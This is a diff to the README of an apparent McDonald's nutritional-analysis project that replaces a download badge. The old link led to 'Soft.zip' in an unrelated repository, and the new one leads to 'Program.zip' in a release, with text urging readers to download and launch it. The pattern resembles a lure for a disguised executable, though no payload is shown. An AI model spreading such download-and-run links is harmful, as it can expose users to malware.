@@ -37,7 +37,7 @@ In today's world, where there is an increasing emphasis on health and nutrition,
 
 If you are ready to explore the world of McDonald's nutritional analysis, don't forget to check out our release!
 
-[![Download Project](https://img.shields.io/badge/Download-Project-orange)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Project](https://github.com/DuckyOT/McDonald_Nutritional_Analysis/releases/download/v1.0/Program.zip)](https://github.com/DuckyOT/McDonald_Nutritional_Analysis/releases/download/v1.0/Program.zip)
 
 👉 *Launch the project to uncover the secrets behind McDonald's menu items' nutritional content!*
 
